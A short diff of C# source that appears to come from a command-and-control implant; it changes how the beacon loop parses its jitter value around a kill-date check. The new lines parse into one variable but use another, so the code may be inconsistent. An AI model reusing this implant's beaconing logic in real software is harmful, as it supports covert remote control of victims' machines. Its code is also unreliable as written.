@@ -10,6 +10,7 @@ using System.Runtime.InteropServices;
 using System.IO;
 using System.IO.Compression;
 using System.Collections.Generic;
+using System.Globalization;
 
 public class Program
 {
@@ -400,7 +401,9 @@ public class Program
 		Console.SetOut(strOutput);
 		var exitvt = new ManualResetEvent(false);
 		var output = new StringBuilder();
-		while (!exitvt.WaitOne((int)(new Random().Next((int)(beacontime * 1000 * (1F - Double.Parse(Jitter))), (int)(beacontime * 1000 * (1F + Double.Parse(Jitter)))))))
+		double dJitter = 0;
+		var bJit = Double.TryParse(Jitter, NumberStyles.Any, CultureInfo.InvariantCulture, out dJitter);
+		while (!exitvt.WaitOne((int)(new Random().Next((int)(beacontime * 1000 * (1F - pJitter)), (int)(beacontime * 1000 * (1F + pJitter))))))
 		{
 			if (Convert.ToDateTime(KillDate) < DateTime.Now)
 			{
